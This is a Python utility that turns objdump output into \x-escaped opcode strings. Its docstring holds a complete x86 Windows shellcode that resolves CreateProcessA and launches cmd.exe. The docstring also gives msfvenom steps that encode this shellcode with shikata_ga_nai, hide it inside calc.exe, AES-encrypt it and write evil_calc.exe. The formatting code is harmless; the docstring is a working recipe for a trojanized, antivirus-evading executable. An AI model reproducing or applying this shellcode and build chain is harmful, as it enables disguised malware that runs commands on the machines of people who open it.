"""
Turns nasty objdump output into a nice, MSFVenom-friendly string like this:
\x8b\xec\x83\xec\x20\x33\xf6\x56\x66\x68\x73\x41\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x89\x65\xfc\x33\xdb\x64\x8b\x1d\x30\x00\x00\x00\x8b\x5b\x0c\x8b\x5b\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10\x89\x5d\xf8\x8b\x43\x3c\x03\xc3\x8b\x40\x78\x03\xc3\x8b\x48\x24\x03\xcb\x89\x4d\xf4\x8b\x78\x20\x03\xfb\x89\x7d\xf0\x8b\x50\x1c\x03\xd3\x89\x55\xec\x8b\x50\x14\x33\xc0\x8b\x7d\xf0\x8b\x75\xfc\x33\xc9\xfc\x8b\x3c\x87\x03\xfb\x66\x83\xc1\x0f\xf3\xa6\x74\x0a\x40\x3b\xc2\x72\xe5\x83\xc4\x26\xeb\x63\x8b\x4d\xf4\x8b\x55\xec\x66\x8b\x04\x41\x8b\x04\x82\x03\xc3\x83\xec\x44\x89\x65\xe8\x83\xec\x10\x89\x65\xe4\x83\xc4\x54\x33\xc9\xb1\x15\x33\xff\x57\xe2\xfd\x33\xd2\x52\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x68\x6d\x33\x32\x5c\x68\x79\x73\x74\x65\x68\x77\x73\x5c\x53\x68\x69\x6e\x64\x6f\x68\x43\x3a\x5c\x57\x8b\xdc\x33\xd2\xff\x75\xe4\xff\x75\xe8\x52\x52\x52\x42\x52\x4a\x52\x52\x52\x53\xff\xd0\x83\xc4\x20\x83\xc4\x54
and prints to stdout AND writes to specified file


Lost my commands from when I initially did this :(
Got some of them, but this isn't a complete tutorial.
Basically, the goal is to use objdump on the assembly to get the raw opcodes + descriptions, then cut it down to only be opcodes
From there, you can run the get_opcodes script. This generates output which plays nicely with MSFVenom :)

objdump -d ASMDemo.exe > dump.dmp
Insert some cut command here to strip everything that isn't opcode 
python -c 'print("\x8b\xec\x83\xec\x20\x33\xf6\x56\x66\x68\x73\x41\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x89\x65\xfc\x33\xdb\x64\x8b\x1d\x30\x00\x00\x00\x8b\x5b\x0c\x8b\x5b\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10\x89\x5d\xf8\x8b\x43\x3c\x03\xc3\x8b\x40\x78\x03\xc3\x8b\x48\x24\x03\xcb\x89\x4d\xf4\x8b\x78\x20\x03\xfb\x89\x7d\xf0\x8b\x50\x1c\x03\xd3\x89\x55\xec\x8b\x50\x14\x33\xc0\x8b\x7d\xf0\x8b\x75\xfc\x33\xc9\xfc\x8b\x3c\x87\x03\xfb\x66\x83\xc1\x0f\xf3\xa6\x74\x0a\x40\x3b\xc2\x72\xe5\x83\xc4\x26\xeb\x63\x8b\x4d\xf4\x8b\x55\xec\x66\x8b\x04\x41\x8b\x04\x82\x03\xc3\x83\xec\x44\x89\x65\xe8\x83\xec\x10\x89\x65\xe4\x83\xc4\x54\x33\xc9\xb1\x15\x33\xff\x57\xe2\xfd\x33\xd2\x52\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x68\x6d\x33\x32\x5c\x68\x79\x73\x74\x65\x68\x77\x73\x5c\x53\x68\x69\x6e\x64\x6f\x68\x43\x3a\x5c\x57\x8b\xdc\x33\xd2\xff\x75\xe4\xff\x75\xe8\x52\x52\x52\x42\x52\x4a\x52\x52\x52\x53\xff\xd0\x83\xc4\x20\x83\xc4\x54")' > bin.bin
cat bin.bin | msfvenom -p- --arch x86 --platform windows -e x86/shikata_ga_nai -i 16 -x calc.exe --format exe --encrypt aes256 -o evil_calc.exe
"""

import sys

opcodes = []
if len(sys.argv) < 3:
	print("Usage: " + sys.argv[0] + " <file_with_opcodes> <file_to_write_bytes_to>")
	exit()
	
with open(sys.argv[1]) as infile:
	for line in infile:
		line_codes = line.strip().split()
		for op in line_codes:
			opcodes.append(op)
			
op_str = ""
for opcode in opcodes:
	op_str += "\\x" + opcode

print(op_str)

with open(sys.argv[2], "w") as outfile:
	for opcode in opcodes:
		outfile.write("\\x" + opcode)